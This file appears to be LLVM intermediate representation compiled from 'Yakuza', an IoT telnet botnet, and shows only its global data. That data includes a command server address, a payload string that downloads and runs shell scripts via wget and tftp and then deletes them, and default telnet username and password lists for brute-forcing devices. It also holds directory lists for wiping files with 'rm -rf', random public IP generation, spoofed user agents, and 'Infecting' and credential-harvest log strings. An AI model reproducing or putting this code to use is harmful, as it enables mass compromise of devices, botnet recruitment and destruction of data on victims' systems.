; ModuleID = 'host/ir_O0/Yakuza.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [13 x i8] c"127.0.0.1:23\00", align 1
@payload = global i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [132 x i8] c"cd /tmp; wget http://127.0.0.1/bins.sh; chmod 777 *; sh bins.sh; tftp -g 127.0.0.1 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh\00", align 1
@tel_usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"support\00default\00root\00\00", align 1
@tel_passwords = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [23 x i8] c"support\00default\00admin\00\00", align 1
@tempdirs = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* null], align 16
@.str.9 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i8* null], align 16
@.str.18 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.23 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.26 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0), i8* null], align 16
@.str.33 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.34 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.35 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* null], align 16
@.str.43 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.50 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.51 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* null], align 16
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@uagents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.111, i32 0, i32 0)], align 16
@.str.54 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.56 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.57 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.58 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.59 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.60 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.61 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.62 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.63 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.65 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.66 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.67 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.68 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.69 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.70 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.71 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.72 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.73 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.74 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.75 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.76 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.77 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.78 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.79 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.80 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.81 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.82 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.83 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.84 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.85 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.86 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.87 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.88 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.89 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.90 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.91 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.93 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.94 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.95 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.96 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.97 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.98 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.99 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.100 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.101 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.102 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.103 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.104 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.105 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.106 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.107 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.108 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.109 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.110 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.111 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.53 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.209 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.114 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@TelnetIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.115 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.117 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.118 = private unnamed_addr constant [81 x i8] c"[ Yakuza ] Cleaning Device || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [75 x i8] c"[ Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
